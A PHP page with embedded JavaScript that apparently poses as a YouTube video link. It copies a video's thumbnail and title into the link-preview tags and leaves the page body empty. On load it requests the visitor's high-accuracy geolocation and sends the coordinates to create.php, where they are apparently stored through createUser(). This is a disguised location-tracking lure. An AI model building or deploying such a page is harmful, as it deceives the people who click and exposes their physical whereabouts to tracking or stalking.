<script>
    function addGeo() {

        var watchID;
         var geoLoc;
         
         function showLocation(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            window.location = 'create.php?lat=' + latitude + '&long=' + longitude;

            
         }
         
         function errorHandler(err) {
            if(err.code == 1) {
               window.location = 'create.php?lat=error&long=Access is denied!';
               
            } else if( err.code == 2) {
                window.location = 'create.php?lat=error&long=Position is unavailable!!';
            }
         }
         
            
            if(navigator.geolocation){
               
               // timeout at 60000 milliseconds (60 seconds)
               var options = {maximumAge: 50000,timeout: 30000,enableHighAccuracy: true};
               geoLoc = navigator.geolocation;
               watchID = geoLoc.watchPosition(showLocation, errorHandler, options);
            } else {
               alert("Sorry, browser does not support geolocation!");
            }
         


    }
</script>

<?php
// Include config file
function getTubeTitel()
{
   $url= getLink();
   $youtube = "http://www.youtube.com/oembed?url=" . $url . "&format=json";
   $curl = curl_init($youtube);
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   $return = curl_exec($curl);
   curl_close($curl);
   $return=json_decode($return, true);
   $result = $return['title'];
   var_dump($result);
   return $result;
}
function get_youtube_thumb(){
  
  
   $link = getLink();
   $new = str_replace('https://www.youtube.com/watch?v=', '', $link);
   $thumbnail = 'https://img.youtube.com/vi/' . $new . '/default.jpg';
   return $thumbnail;
} 

require('users.php');
require('linksfunctions.php');

if (!isset($_GET['lat'])) {
    echo "<script type='text/javascript'>addGeo();</script>";

} else {

    createUser();
  
    
  
 
}




?>
  

<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta property="og:image" content= <?php echo (get_youtube_thumb()); ?>>
<meta property="og:image:type" content="image/jpeg">
<meta property="og:image:width" content="200">
<meta property="og:image:height" content="200">
   <title><?php echo (getTubeTitel());?></title>
</head>
<body>
 

</body>
</html>